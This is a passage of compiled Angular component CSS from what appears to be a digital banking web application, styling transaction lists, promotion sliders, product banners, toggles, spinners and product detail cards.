      .movements-list-container-content .list-movements .items .item .item-details .icon-descarga {
        bottom: 32px
      }
    }

    .movements-list-container-content .list-movements .items .item .item-details .icon-descarga:hover {
      color: #6a81e7
    }

    .movements-list-container-content .list-movements .date-header {
      display: flex;
      justify-content: flex-start;
      margin-bottom: 1rem;
      margin-top: 1rem
    }

    .movements-list-container-content .list-movements .date-header h6 {
      font-size: 14px;
      font-weight: 600;
      line-height: 1.71;
      margin-bottom: 0
    }

    .movements-list-container-content .list-movements .date-header h6:before {
      display: inline-block;
      content: "";
      border-top: 1px solid black;
      height: 2px;
      width: 24px;
      transform: translateY(90%);
      margin-right: 5px;
      margin-bottom: .2rem
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c245_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c245_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .slider-container-item[_ngcontent-qmv-c245] {
      height: 50px;
      position: relative;
      display: flex;
      justify-content: flex-start;
      align-content: center;
      align-items: center;
      padding: 0
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .slider-container-item-image[_ngcontent-qmv-c245] {
      margin-left: 5px;
      margin-right: 5px
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .slider-container-item-image[_ngcontent-qmv-c245] img[_ngcontent-qmv-c245] {
      height: 40px;
      width: 40px;
      object-fit: cover;
      border-radius: 4px
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .slider-container-item-info[_ngcontent-qmv-c245] {
      display: flex;
      flex-direction: column;
      padding: 5px
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .slider-container-item-info[_ngcontent-qmv-c245] h5[_ngcontent-qmv-c245] {
      font-size: 12px;
      color: #2c2c33;
      font-weight: 600;
      line-height: 1.33;
      margin-bottom: 4px
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .slider-container-item-info[_ngcontent-qmv-c245] .avv-information-link[_ngcontent-qmv-c245] {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      padding: 16px 16px 0;
      text-align: left;
      color: #0048db;
      cursor: pointer;
      margin-top: 0
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .slider-container-item-info[_ngcontent-qmv-c245] .avv-information-link[_ngcontent-qmv-c245] i[_ngcontent-qmv-c245] {
      font-size: 16px;
      color: #0048db;
      margin-top: -2px;
      margin-right: 8px
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .slider-container-item-info[_ngcontent-qmv-c245] .avv-information-link[_ngcontent-qmv-c245] small[_ngcontent-qmv-c245] {
      color: #0048db;
      font-weight: 600;
      text-decoration: underline
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .glide__bullets[_ngcontent-qmv-c245] {
      position: absolute;
      right: 6px;
      bottom: -25px;
      display: block;
      transform: none;
      left: unset
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .glide__bullets[_ngcontent-qmv-c245] .glide__bullet[_ngcontent-qmv-c245] {
      background-color: #dbe2e8;
      width: 8px;
      height: 8px;
      margin-right: 12px;
      margin-left: 0;
      border: none
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .glide__bullets[_ngcontent-qmv-c245] .glide__bullet[_ngcontent-qmv-c245]:last-child {
      margin-right: 0
    }

    .promotions-nav-bar[_ngcontent-qmv-c245] .nav-promotions-slider[_ngcontent-qmv-c245] .glide__bullets[_ngcontent-qmv-c245] .glide__bullet--active[_ngcontent-qmv-c245] {
      width: 30px;
      height: 8px;
      border-radius: 4px;
      background-color: #0048db
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c246_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c246_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .home-promotions[_ngcontent-qmv-c246] {
      position: relative;
      z-index: 0;
      border-radius: 4px
    }

    .home-promotions-container[_ngcontent-qmv-c246] {
      padding: 16px
    }

    .home-promotions-container[_ngcontent-qmv-c246] .btn-primary[_ngcontent-qmv-c246] {
      font-size: 12px;
      line-height: 16px;
      max-width: 100%
    }

    .home-promotions-title[_ngcontent-qmv-c246] {
      position: relative;
      padding-bottom: 40px;
      margin-bottom: 0;
      font-size: 18px;
      font-weight: 600;
      line-height: 1.78
    }

    .home-promotions-title[_ngcontent-qmv-c246]:before,
    .home-promotions-title[_ngcontent-qmv-c246]:after {
      content: "";
      position: absolute;
      left: 6%;
      bottom: 28px;
      transform: translate(-50%);
      width: 28px;
      height: 4px;
      border-radius: 2px;
      background-color: #e1001d
    }

    .home-promotions-title[_ngcontent-qmv-c246]:after {
      left: 17%;
      width: 15px
    }

    .home-promotions-images[_ngcontent-qmv-c246] {
      border-radius: 4px
    }

    .home-promotions-images[_ngcontent-qmv-c246] img[_ngcontent-qmv-c246] {
      transition: all 1s ease-in-out;
      opacity: 1;
      width: 100%;
      max-height: 156px
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c115_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c115_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .product-acquire__banner.active[_ngcontent-qmv-c115] {
      display: flex;
      flex-direction: column;
      position: relative;
      padding: 12px;
      margin: 0 16px;
      border-radius: 7px;
      box-shadow: 0 2px 4px #2c2c333d;
      cursor: pointer;
      background: no-repeat white 50% center/190% url(/bancadigital/assets/img/illustrations/digital-debit-card/active-background-1.svg)
    }

    @media (min-width: 576px) {
      .product-acquire__banner.active[_ngcontent-qmv-c115] {
        background: no-repeat white 50% center/165% url(/bancadigital/assets/img/illustrations/digital-debit-card/active-background-1.svg)
      }
    }

    @media (min-width: 768px) {
      .product-acquire__banner.active[_ngcontent-qmv-c115] {
        margin: 0
      }
    }

    .product-acquire__banner.active[_ngcontent-qmv-c115] .new[_ngcontent-qmv-c115] {
      position: absolute;
      top: -9px;
      right: 20px;
      background-color: #a00104;
      width: 49px;
      height: 20px;
      padding: 3px 6px 1px;
      border-radius: 4px;
      color: #fff;
      font-size: 12px;
      font-weight: 400;
      line-height: 1.33
    }

    .product-acquire__banner.active[_ngcontent-qmv-c115] .title[_ngcontent-qmv-c115] {
      display: flex
    }

    .product-acquire__banner.active[_ngcontent-qmv-c115] .title[_ngcontent-qmv-c115] img[_ngcontent-qmv-c115] {
      width: 15px;
      height: 18px;
      margin-right: 9px
    }

    .product-acquire__banner.active[_ngcontent-qmv-c115] .title[_ngcontent-qmv-c115] p[_ngcontent-qmv-c115] {
      font-size: 16px;
      font-weight: 600;
      line-height: 1.5;
      margin: 0
    }

    .product-acquire__banner.active[_ngcontent-qmv-c115] .action[_ngcontent-qmv-c115] {
      margin-left: 26px
    }

    .product-acquire__banner.active[_ngcontent-qmv-c115] .action[_ngcontent-qmv-c115] a[_ngcontent-qmv-c115] {
      display: flex;
      align-items: center;
      font-size: 12px;
      font-weight: 400;
      line-height: 1.5;
      color: #0048db
    }

    .product-acquire__banner.active[_ngcontent-qmv-c115] .action[_ngcontent-qmv-c115] a[_ngcontent-qmv-c115] i[_ngcontent-qmv-c115] {
      font-size: 16px;
      margin-right: 8px
    }

    .product-acquire__inactive-banner[_ngcontent-qmv-c115] {
      display: flex;
      gap: 12px;
      border-radius: 8px;
      padding: 7px 16px;
      cursor: pointer
    }

    .product-acquire__inactive-banner_highlight[_ngcontent-qmv-c115] {
      font-size: 9px;
      line-height: 12px;
      font-weight: 400;
      color: #fff;
      background-color: #e1001d;
      transform: rotate(180deg);
      writing-mode: vertical-rl;
      white-space: nowrap;
      text-align: center;
      padding: 0 3px;
      border-radius: 0 6px 6px 0
    }

    .product-acquire__inactive-banner[_ngcontent-qmv-c115] .image[_ngcontent-qmv-c115] {
      width: 60px;
      height: 78px;
      margin: auto
    }

    .product-acquire__inactive-banner_container-description[_ngcontent-qmv-c115] {
      display: flex;
      min-height: 42px
    }

    .product-acquire__inactive-banner_content[_ngcontent-qmv-c115] {
      padding-bottom: 3px
    }

    @media (min-width: 768px) {
      .product-acquire__inactive-banner_container_large[_ngcontent-qmv-c115] {
        display: flex;
        justify-content: space-between;
        gap: 16px;
        margin: auto 0;
        width: 100%
      }
    }

    .product-acquire__inactive-banner.default[_ngcontent-qmv-c115] {
      background-color: #fff;
      border: 1px solid #89A9CA
    }

    .product-acquire__inactive-banner.info[_ngcontent-qmv-c115] {
      background-color: #89a9ca;
      border: 1px solid #89A9CA
    }

    .product-acquire__inactive-banner.pink[_ngcontent-qmv-c115] {
      background-color: #f5ebf1;
      border: 1px solid #F5EBF1
    }

    .product-acquire__inactive-banner.gray[_ngcontent-qmv-c115] {
      background-color: #f1f1f1;
      border: 1px solid #F1F1F1
    }

    .product-acquire__inactive-banner.green[_ngcontent-qmv-c115] {
      padding: 8px 16px;
      background-color: #e1eef0;
      border: 1px solid #E1EEF0
    }

    .product-acquire__inactive-banner.green[_ngcontent-qmv-c115] button[_ngcontent-qmv-c115] {
      padding: 0
    }

    .product-acquire__inactive-banner.exclusive[_ngcontent-qmv-c115] {
      background-color: #fef8ee;
      border: 1px solid #E1001D;
      padding: 0 16px 0 0
    }

    .product-acquire__inactive-banner_title_info_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_info_large[_ngcontent-qmv-c115] {
      font-size: 8px;
      line-height: 12px;
      font-weight: 400;
      color: #fff;
      margin: 0
    }

    @media (min-width: 1200px) {
      .product-acquire__inactive-banner_title_info_large[_ngcontent-qmv-c115] {
        font-size: 12px;
        line-height: 16px;
        font-weight: 400;
        color: #fff
      }
    }

    .product-acquire__inactive-banner_title_default_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_pink_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_gray_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_green_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_exclusive_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_default_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_pink_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_gray_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_green_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_exclusive_large[_ngcontent-qmv-c115] {
      font-size: 8px;
      line-height: 12px;
      font-weight: 400;
      color: #000;
      margin: 0
    }

    @media (min-width: 768px) {

      .product-acquire__inactive-banner_title_default_large[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_title_pink_large[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_title_gray_large[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_title_green_large[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_title_exclusive_large[_ngcontent-qmv-c115] {
        font-size: 12px;
        line-height: 16px;
        font-weight: 400;
        color: #000
      }
    }

    .product-acquire__inactive-banner_title_exclusive_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_title_exclusive_large[_ngcontent-qmv-c115] {
      padding-top: 7px
    }

    .product-acquire__inactive-banner_description_info_small[_ngcontent-qmv-c115] {
      font-size: 12px;
      line-height: 14px;
      font-weight: 600;
      color: #fff;
      margin: auto 0
    }

    .product-acquire__inactive-banner_description_info_large[_ngcontent-qmv-c115] {
      font-size: 12px;
      line-height: 14px;
      font-weight: 600;
      color: #fff;
      margin: auto
    }

    @media (min-width: 768px) {
      .product-acquire__inactive-banner_description_info_large[_ngcontent-qmv-c115] {
        font-size: 16px;
        line-height: 16px;
        font-weight: 600;
        color: #fff
      }
    }

    .product-acquire__inactive-banner_description_default_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_pink_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_gray_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_green_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_exclusive_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_default_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_pink_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_gray_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_green_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_description_exclusive_large[_ngcontent-qmv-c115] {
      font-size: 12px;
      line-height: 14px;
      font-weight: 600;
      color: #000;
      margin: auto 0
    }

    @media (min-width: 768px) {

      .product-acquire__inactive-banner_description_default_large[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_description_pink_large[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_description_gray_large[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_description_green_large[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_description_exclusive_large[_ngcontent-qmv-c115] {
        font-size: 16px;
        line-height: 16px;
        font-weight: 600;
        color: #000
      }
    }

    .product-acquire__inactive-banner_actions_info_small[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115] {
      font-size: 12px;
      line-height: 12px;
      font-weight: 400;
      color: #fff;
      text-decoration: underline;
      text-align: left;
      padding: 4px 0 0
    }

    .product-acquire__inactive-banner_actions_info_large[_ngcontent-qmv-c115] {
      margin: auto 0
    }

    .product-acquire__inactive-banner_actions_info_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115] {
      font-size: 12px;
      line-height: 12px;
      font-weight: 400;
      color: #fff;
      text-decoration: underline;
      text-align: left;
      padding: 4px 0 0
    }

    @media (min-width: 768px) {
      .product-acquire__inactive-banner_actions_info_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115] {
        font-size: 15px;
        line-height: 12px;
        font-weight: 400;
        color: #fff
      }
    }

    .product-acquire__inactive-banner_actions_pink_small[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_gray_small[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_green_small[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_exclusive_small[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115] {
      font-size: 12px;
      line-height: 12px;
      font-weight: 400;
      color: #0048db;
      text-decoration: underline;
      text-align: left;
      padding: 4px 0 0
    }

    .product-acquire__inactive-banner_actions_pink_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_gray_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_green_large[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_exclusive_large[_ngcontent-qmv-c115] {
      margin: auto 0
    }

    .product-acquire__inactive-banner_actions_pink_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_gray_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_green_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_exclusive_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115] {
      font-size: 12px;
      line-height: 12px;
      font-weight: 400;
      color: #0048db;
      text-decoration: underline;
      text-align: left;
      padding: 4px 0 0
    }

    @media (min-width: 768px) {

      .product-acquire__inactive-banner_actions_pink_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_actions_gray_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_actions_green_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115],
      .product-acquire__inactive-banner_actions_exclusive_large[_ngcontent-qmv-c115] .btn[_ngcontent-qmv-c115] {
        font-size: 15px;
        line-height: 12px;
        font-weight: 400;
        color: #0048db
      }
    }

    .product-acquire__inactive-banner_actions_exclusive_small[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_exclusive_large[_ngcontent-qmv-c115] {
      padding-bottom: 7px
    }

    .product-acquire__inactive-banner_actions_default_small[_ngcontent-qmv-c115] .btn-new[_ngcontent-qmv-c115],
    .product-acquire__inactive-banner_actions_default_large[_ngcontent-qmv-c115] .btn-new[_ngcontent-qmv-c115] {
      margin: 8px 0 0;
      width: auto
    }
  </style>
  <style>
    [_nghost-qmv-c101] {
      overflow: hidden;
      display: block
    }

    .drag-scroll-content[_ngcontent-qmv-c101] {
      height: 100%;
      overflow: auto;
      white-space: nowrap
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c57_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c57_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .avv-toggle[_ngcontent-qmv-c57] {
      display: block;
      margin: 0;
      position: relative
    }

    .avv-toggle[_ngcontent-qmv-c57]:hover {
      cursor: pointer
    }

    .avv-toggle.active[_ngcontent-qmv-c57]:before {
      background-color: #00c796
    }

    .avv-toggle.active[_ngcontent-qmv-c57]:after {
      background-color: #fff
    }

    .avv-toggle[_ngcontent-qmv-c57]:before {
      content: "";
      position: absolute;
      left: 0;
      top: -3px;
      border-color: #acbac9;
      border-radius: 12px;
      background-color: #acbac9
    }

    .avv-toggle[_ngcontent-qmv-c57]:after {
      content: "";
      position: absolute;
      border-radius: 50px;
      transition: .3s;
      background-color: #fff;
      box-shadow: 0 2px 3px #2c2c333d
    }

    .avv-toggle.small-size[_ngcontent-qmv-c57] {
      padding: 0 23px 0 0
    }

    .avv-toggle.small-size[_ngcontent-qmv-c57]:before {
      width: 23px;
      height: 14px
    }

    .avv-toggle.small-size[_ngcontent-qmv-c57]:after {
      left: 1px;
      top: -2px;
      width: 12px;
      height: 12px
    }

    .avv-toggle.small-size.active[_ngcontent-qmv-c57]:after {
      left: 10px
    }

    .avv-toggle.normal-size[_ngcontent-qmv-c57] {
      padding: 0 33px 0 0
    }

    .avv-toggle.normal-size[_ngcontent-qmv-c57]:before {
      width: 33px;
      height: 20px
    }

    .avv-toggle.normal-size[_ngcontent-qmv-c57]:after {
      left: 2px;
      top: -1px;
      width: 16px;
      height: 16px
    }

    .avv-toggle.normal-size.active[_ngcontent-qmv-c57]:after {
      left: 15px
    }

    .avv-toggle.big-size[_ngcontent-qmv-c57] {
      padding: 0 40px 0 0
    }

    .avv-toggle.big-size[_ngcontent-qmv-c57]:before {
      width: 40px;
      height: 24px
    }

    .avv-toggle.big-size[_ngcontent-qmv-c57]:after {
      left: 2px;
      top: -1px;
      width: 20px;
      height: 20px
    }

    .avv-toggle.big-size.active[_ngcontent-qmv-c57]:after {
      left: 18px
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c251_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c251_spin {
      to {
        transform: rotate(360deg)
      }
    }

    @keyframes _ngcontent-qmv-c251_spinner-border {
      to {
        transform: rotate(360deg)
      }
    }

    .spinner-border[_ngcontent-qmv-c251],
    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251] div.loader-call-credits[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251]:before,
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] div.loader-call-credits[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251]:before {
      display: inline-block;
      width: 2rem;
      height: 2rem;
      vertical-align: text-bottom;
      border: .25em solid currentColor;
      border-right-color: transparent;
      border-radius: 50%;
      animation: _ngcontent-qmv-c251_spinner-border .75s linear infinite
    }

    .spinner-border-sm[_ngcontent-qmv-c251] {
      width: 1rem;
      height: 1rem;
      border-width: .2em
    }

    @keyframes _ngcontent-qmv-c251_spinner-grow {
      0% {
        transform: scale(0)
      }

      50% {
        opacity: 1
      }
    }

    .spinner-grow[_ngcontent-qmv-c251] {
      display: inline-block;
      width: 2rem;
      height: 2rem;
      vertical-align: text-bottom;
      background-color: currentColor;
      border-radius: 50%;
      opacity: 0;
      animation: _ngcontent-qmv-c251_spinner-grow .75s linear infinite
    }

    .spinner-grow-sm[_ngcontent-qmv-c251] {
      width: 1rem;
      height: 1rem
    }

    .products-detail[_ngcontent-qmv-c251] {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      height: 238px;
      width: 190px;
      z-index: 1000
    }

    .products-detail[_ngcontent-qmv-c251] .new[_ngcontent-qmv-c251] {
      position: absolute;
      top: 5px;
      right: 8px;
      background-color: #a00104;
      width: 49px;
      height: 20px;
      padding: 3px 6px 1px;
      border-radius: 4px;
      color: #fff;
      font-size: 12px;
      font-weight: 400;
      line-height: 1.33
    }

    .products-detail.collapsed[_ngcontent-qmv-c251] {
      height: 98px
    }

    .products-detail.selected[_ngcontent-qmv-c251] {
      border: 2px solid #6a81e7;
      background-color: #f1f2ff;
      border-radius: 8px;
      box-sizing: border-box;
      transition: transform .25s
    }

    .products-detail.digital-debit-card-background[_ngcontent-qmv-c251] {
      background: no-repeat #F8F8F8 64% top/129% url(/bancadigital/assets/img/illustrations/digital-debit-card/active-background-2.svg);
      border-radius: 7px
    }

    @media (min-width: 992px) {
      .products-detail[_ngcontent-qmv-c251] {
        height: 242px;
        border: 2px solid transparent
      }

      .products-detail[_ngcontent-qmv-c251]:hover {
        border: 2px solid #6a81e7;
        border-radius: 8px;
        box-sizing: border-box;
        transition: transform .25s
      }

      .products-detail[_ngcontent-qmv-c251]:hover .products-detail-footer[_ngcontent-qmv-c251] {
        display: flex
      }

      .products-detail[_ngcontent-qmv-c251]:hover .digital-debit-card-footer[_ngcontent-qmv-c251] {
        background-color: #fff
      }

      .products-detail.without-show-details[_ngcontent-qmv-c251]:hover .digital-debit-card-footer[_ngcontent-qmv-c251] {
        background-color: transparent
      }
    }

    .products-detail[_ngcontent-qmv-c251] *[_ngcontent-qmv-c251] {
      margin: 0
    }

    .products-detail-body[_ngcontent-qmv-c251] {
      display: flex;
      flex-direction: column;
      position: relative;
      padding: 24px 24px 0;
      height: 190px;
      min-height: 190px;
      max-height: 190px;
      cursor: pointer
    }

    .products-detail-body.collapsed[_ngcontent-qmv-c251] {
      height: 100px;
      min-height: 100px;
      max-height: 100px;
      padding: 8px 8px 0 16px
    }

    .products-detail-body.collapsed[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] .aval[_ngcontent-qmv-c251] {
      font-size: 12px;
      line-height: 1.33
    }

    .products-detail-body.collapsed[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] p.type-detail-name[_ngcontent-qmv-c251] {
      display: none
    }

    .products-detail-body.collapsed[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] h6.type-name[_ngcontent-qmv-c251] {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251],
    .products-detail-body[_ngcontent-qmv-c251] .info[_ngcontent-qmv-c251] {
      color: #283747
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] {
      margin-bottom: 10px;
      display: flex;
      flex-direction: column;
      justify-content: space-between
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] h6[_ngcontent-qmv-c251] {
      font-size: 14px;
      font-weight: 600;
      line-height: 1.71;
      word-wrap: break-word;
      overflow: hidden;
      white-space: initial
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251] {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] p.type-detail-name[_ngcontent-qmv-c251] {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400;
      color: #5c6b7a;
      margin-bottom: 2px
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] p.number-product[_ngcontent-qmv-c251] {
      font-size: 11px;
      line-height: 1.45;
      font-weight: 400;
      color: #2c2c33
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] .aval[_ngcontent-qmv-c251] {
      font-size: 14px;
      line-height: 1.71;
      font-weight: 400;
      margin-top: 0;
      word-wrap: break-word;
      overflow: hidden;
      white-space: initial
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] .tuplus[_ngcontent-qmv-c251] {
      height: 40px;
      width: 128px;
      margin-top: 8px;
      margin-bottom: 35px
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] h6.type-name[_ngcontent-qmv-c251] {
      font-size: 14px;
      line-height: 1.71;
      font-weight: 600;
      color: #2c2c33;
      margin-top: 5px;
      margin-bottom: 2px
    }

    .products-detail-body[_ngcontent-qmv-c251] .header.credits[_ngcontent-qmv-c251] img[_ngcontent-qmv-c251] {
      width: 24px;
      height: 20px
    }

    .products-detail-body[_ngcontent-qmv-c251] .header[_ngcontent-qmv-c251] .icon[_ngcontent-qmv-c251] {
      font-size: 20px
    }

    .products-detail-body[_ngcontent-qmv-c251] .header.alert-zero-credit-cards[_ngcontent-qmv-c251] {
      align-items: center;
      margin-bottom: 0
    }

    .products-detail-body[_ngcontent-qmv-c251] .header.alert-zero-credit-cards[_ngcontent-qmv-c251] img[_ngcontent-qmv-c251] {
      width: 45px;
      height: 45px
    }

    .products-detail-body[_ngcontent-qmv-c251] .header.alert-zero-credit-cards[_ngcontent-qmv-c251] h6[_ngcontent-qmv-c251] {
      font-size: 14px;
      line-height: 1.42;
      font-weight: 400;
      color: #2c2c33;
      text-align: center;
      margin: 22px 0 0
    }

    .products-detail-body[_ngcontent-qmv-c251] .header.alert-zero-credit-cards.collapsed-header[_ngcontent-qmv-c251] {
      align-items: flex-start
    }

    .products-detail-body[_ngcontent-qmv-c251] .header.alert-zero-credit-cards.collapsed-header[_ngcontent-qmv-c251] img[_ngcontent-qmv-c251] {
      width: 25px;
      height: 25px
    }

    .products-detail-body[_ngcontent-qmv-c251] .header.alert-zero-credit-cards.collapsed-header[_ngcontent-qmv-c251] h6[_ngcontent-qmv-c251] {
      font-size: 11px;
      line-height: 1.42;
      font-weight: 400;
      color: #2c2c33;
      margin: 6px 0 0
    }

    .products-detail-body[_ngcontent-qmv-c251] .info[_ngcontent-qmv-c251] {
      position: absolute;
      bottom: 0;
      margin-bottom: 8px
    }

    .products-detail-body[_ngcontent-qmv-c251] .info[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251] {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400;
      margin-bottom: 0
    }

    .products-detail-body[_ngcontent-qmv-c251] .info[_ngcontent-qmv-c251] h5[_ngcontent-qmv-c251] {
      font-size: 16px;
      line-height: 1.5
    }

    .products-detail-body[_ngcontent-qmv-c251] .info.digital-debit-card[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251] {
      font-size: 14px;
      line-height: 1.71;
      font-weight: 400;
      color: #2c2c33
    }

    .products-detail-body[_ngcontent-qmv-c251] .aval-icons[_ngcontent-qmv-c251] {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      width: 142px
    }

    .products-detail-body[_ngcontent-qmv-c251] .aval-icons-section[_ngcontent-qmv-c251] {
      display: flex;
      flex-direction: row;
      justify-content: space-evenly
    }

    .products-detail-body[_ngcontent-qmv-c251] .aval-icons[_ngcontent-qmv-c251] img[_ngcontent-qmv-c251] {
      width: 45px;
      height: 45px
    }

    .products-detail-footer[_ngcontent-qmv-c251] {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100%;
      width: 100%;
      background: #F1F2FF;
      cursor: default;
      border-radius: 0 0 8px 8px
    }

    @media (min-width: 992px) {
      .products-detail-footer[_ngcontent-qmv-c251] {
        display: none
      }
    }

    .products-detail-footer.without-pay[_ngcontent-qmv-c251] {
      justify-content: flex-end;
      padding-right: 1rem
    }

    .products-detail-footer[_ngcontent-qmv-c251]>div[_ngcontent-qmv-c251] {
      display: flex;
      align-items: center
    }

    .products-detail-footer[_ngcontent-qmv-c251] hr[_ngcontent-qmv-c251] {
      height: 1px;
      width: 24px;
      transform: rotate(90deg);
      color: #dbe2e8
    }

    .products-detail-footer[_ngcontent-qmv-c251] .btn[_ngcontent-qmv-c251] {
      background-color: transparent;
      width: initial;
      cursor: pointer
    }

    .products-detail-footer[_ngcontent-qmv-c251] .btn-detail[_ngcontent-qmv-c251] {
      color: #0048db;
      font-size: 12px;
      line-height: 2;
      font-weight: 600;
      padding: 10px;
      text-align: center;
      border-radius: 0;
      text-decoration: underline
    }

